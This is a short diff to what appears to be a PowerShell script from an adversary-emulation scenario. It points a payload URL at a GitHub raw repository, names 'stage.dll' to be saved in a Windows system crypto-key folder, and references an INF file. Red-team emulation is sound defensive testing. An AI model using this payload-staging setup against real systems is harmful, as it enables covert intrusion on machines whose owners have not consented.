@@ -1,7 +1,7 @@
 param()
 
 # Configuration
-$githubBase = "https://raw.githubusercontent.com/<user>/<repo>/main/scenario-01-rmm/github"
+$githubBase = "https://raw.githubusercontent.com/Justanother-engineer/scenario1/main"
 $stageUrl = "$githubBase/stage.dll"
 $stagePath = "C:\ProgramData\Microsoft\Crypto\RSA\S-1-5-18\stage.dll"
 $infPath = "C:\ProgramData\config.inf"
